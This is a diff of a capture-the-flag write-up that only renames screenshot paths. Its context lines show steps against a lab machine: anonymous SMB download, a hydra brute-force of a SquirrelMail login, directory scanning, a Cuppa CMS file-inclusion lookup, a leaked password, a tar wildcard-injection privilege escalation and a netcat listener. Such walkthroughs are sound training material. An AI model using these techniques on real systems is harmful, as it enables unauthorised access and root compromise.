@@ -19,7 +19,7 @@ smbget -R smb://10.10.13.172/anonymous
 cat logs/log* | sort | uniq  > passwords.txt 
 ```
 
-<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (39) (1).png" alt=""><figcaption></figcaption></figure>
 
 There is also an email from Miles Dyson, as it's just his name I tried different varations of his name for a username. There is a folder on samba that could be the username as well, milesdyson.&#x20;
 
@@ -43,7 +43,7 @@ gobuster dir 10.10.13.172 -u http://10.10.13.172 -w /usr/share/wordlists/dirbust
 hydra -l milesdyson -P passwords.txt 10.10.13.172 http-post-form "/squirrelmail/src/login.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F incorrect" -V -F -u
 ```
 
-<figure><img src="../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (27) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can now login to squirrelmail that gobuster discovered.
 
@@ -60,7 +60,7 @@ Password: )s{A&2Z=F^n_E.B`
 
 <figure><img src="../../.gitbook/assets/image (32) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (35) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 gobuster dir 10.10.13.172 -u http://10.10.13.172/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -77,7 +77,7 @@ searchsploit cuppa
 searchsploit -x php/webapps/25971.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (33) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (33) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Testing LFI and it works
 
@@ -123,13 +123,13 @@ stty raw -echo;fg
 
 There is a backup script that is ran every minute by root which backs up /var/www/html
 
-<figure><img src="../../.gitbook/assets/image (14) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (31) (1).png" alt=""><figcaption></figcaption></figure>
 
 ****
 
-<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -152,7 +152,7 @@ touch /var/www/html/--checkpoint-action=exec=bash\ shell
 nc -nvlp 1338
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 There is a password in the configuration file, it does not work for root but we see in the home directory another user called jjameson
 
